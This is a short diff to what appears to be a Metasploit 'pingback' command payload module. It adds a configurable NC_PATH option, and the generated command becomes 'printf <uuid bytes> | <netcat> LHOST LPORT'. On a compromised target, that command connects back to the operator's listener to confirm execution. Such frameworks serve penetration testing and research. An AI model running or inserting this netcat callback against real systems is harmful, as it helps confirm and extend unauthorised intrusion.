@@ -28,6 +28,9 @@ module MetasploitModule
       'PayloadType'   => 'cmd',
       'RequiredCmd'   => 'netcat'
     ))
+    register_options([
+      OptString.new('NC_PATH', [true, 'The path to Netcat', 'nc'])
+    ])
   end
 
   #
@@ -42,6 +45,6 @@ module MetasploitModule
   #
   def command_string
     self.pingback_uuid ||= self.generate_pingback_uuid
-    "printf '#{pingback_uuid.scan(/../).map { |x| "\\x" + x }.join}' | nc #{datastore['LHOST']} #{datastore['LPORT']}"
+    "printf '#{pingback_uuid.scan(/../).map { |x| "\\x" + x }.join}' | #{datastore['NC_PATH']} #{datastore['LHOST']} #{datastore['LPORT']}"
   end
 end
